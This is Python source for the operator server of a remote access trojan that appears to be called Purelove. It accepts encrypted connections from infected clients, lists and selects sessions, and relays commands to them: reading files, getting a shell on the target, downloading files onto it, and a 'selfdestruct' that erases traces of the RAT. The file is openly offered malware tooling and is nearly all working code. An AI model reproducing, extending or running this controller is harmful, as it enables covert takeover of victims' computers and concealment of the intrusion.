#!/usr/bin/env python
# -*- coding: utf-8 -*-
#

#
# https://github.com/hucmosin/purelove
#

import argparse
import readline
import socket
import sys
import threading

from core.crypto import encrypt, decrypt, diffie_hell_man

BANNER = '''

 ____     ___  ____    ___   __ __  ____   ___   
|    \   /  _]|    \  /   \ |  |  ||    \ |   \  
|  D  ) /  [_ |  o  )|     ||  |  ||  _  ||    \ 
|    / |    _]|     ||  O  ||  |  ||  |  ||  D  |
|    \ |   [_ |  O  ||     ||  :  ||  |  ||     |   
|  .  \|     ||     ||     ||     ||  |  ||     |
|__|\_||_____||_____| \___/  \__,_||__|__||_____|

        https://github.com/hucmosin/purelove
        
    ___________________
   |,-----.,-----.,---.\
   ||     ||     ||    \\
   |`-----'|-----||-----\`----.
   [       |    -||-   _|    (|
   [  ,--. |_____||___/.--.   |
   =-(( `))-----------(( `))-==
  mosin`--'             `--'

'''

CLIENT_COMMANDS = [ 'cat','shell', 'ls', 'pwd','selfdestruct','wget','unzip']

HELP_TEXT = '''

Command               Description
-------               -----------
cat <file>            Output a file to the screen.
session <id>          Connect to a client.
sessions              List connected clients.
shell                 Execute a command on the target,get os shell
help                  Show this help menu.
kill                  Kill the client connection.
ls                    List files in the current directory.
pwd                   Get the present working directory.
quit                  Exit the server and keep all clients alive.
selfdestruct          Remove all traces of the RAT from the target system.
unzip <file>          Unzip a file.
wget <url>            Download a file from the web.'''




class Server(threading.Thread):
    clients      = {}       
    client_count = 1        
    current_client = None  

    def __init__(self,host, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        self.s.bind((host, port))
        self.s.listen(10)
        
    def run(self):
        while True:
            conn, addr = self.s.accept()  
            dhkey = diffie_hell_man(conn) 
            client_id = self.client_count 
            client = ClientConnection(conn, addr, dhkey, uid=client_id)
            #client = ClientConnection(conn, addr, uid=client_id)
            self.clients[client_id] = client 
            self.client_count += 1  

 
    def send_client(self, message, client):
        try:
            enc_message = encrypt(message, client.dhkey) 
            client.conn.send(enc_message)
        except Exception as e:
            print '[!] Error: {}'.format(e) 

    def recv_client(self, client):
        try:
            recv_data = client.conn.recv(4096)
            print decrypt(recv_data, client.dhkey) 
            #print recv_data
        except Exception as e:
            print '[!] Error: {}'.format(e)

    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)] 
            print '[*] Client {} selected.'.format(client_id)
        except (KeyError, ValueError):
            print '[!] Error: Invalid Client ID.'

    def remove_client(self, key):
        return self.clients.pop(key, None)

    def kill_client(self, _):
        self.send_client('kill', self.current_client) 
        self.current_client.conn.close()              
        self.remove_client(self.current_client.uid)   
        self.current_client = None                    

    def selfdestruct_client(self, _):
        self.send_client('selfdestruct', self.current_client) 
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def get_clients(self):
        return [v for _, v in self.clients.items()]

    def list_clients(self, _):
        print 'ID   Client Address'
        print '--   --------------'
        for k, v in self.clients.items():
            print '{:>2}   {}'.format(k, v.addr[0])

    def cmd_shell(self,server):
        pass

    
    def quit_server(self, _):
        if raw_input(u'是否退出 (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('quit', c)    
            self.s.shutdown(socket.SHUT_RDWR)   
            self.s.close()
            sys.exit(0)

    def print_help(self, _):
        print HELP_TEXT


class ClientConnection():
    def __init__(self, conn, addr, dhkey, uid=0):
        self.conn  = conn
        self.addr  = addr
        self.dhkey = dhkey
        self.uid   = uid


def run_hander(host,port):
    client = None

    print BANNER

    server = Server(host,port)
    server.setDaemon(True)
    server.start()
    print 'Purelove server {host} listening for connections on port {port}.'.format(host = host,
                                                                                port = port)

    server_commands = {
        'session':       server.select_client,
        'sessions':      server.list_clients,
        'help':          server.print_help,
        'kill':          server.kill_client,
        'quit':          server.quit_server,
        'selfdestruct':  server.selfdestruct_client
    }

    def completer(text, state):
        commands = CLIENT_COMMANDS + [k for k, _ in server_commands.items()]

        options = [i for i in commands if i.startswith(text)]
        if state < len(options):
            return options[state] + ' '
        else:
            return None

    readline.parse_and_bind('tab: complete')
    readline.set_completer(completer)

    while True:
        if Server.clients:
            if server.current_client:
                ccid = server.current_client.uid
            else:
                ccid = '?'

            prompt = raw_input('rebound {}> '.format(ccid)).rstrip()

            if not prompt:
                continue

            cmd, _, action = prompt.partition(' ')

            if cmd in server_commands:
                server_commands[cmd](action)

            elif cmd in CLIENT_COMMANDS:
                if ccid == '?':
                    print '[-] Error: No client selected.'
                    continue

                server.send_client(prompt, server.current_client)
                server.recv_client(server.current_client)

            else:
                print '[!] Invalid command, type "help" to see a list of commands.'





    
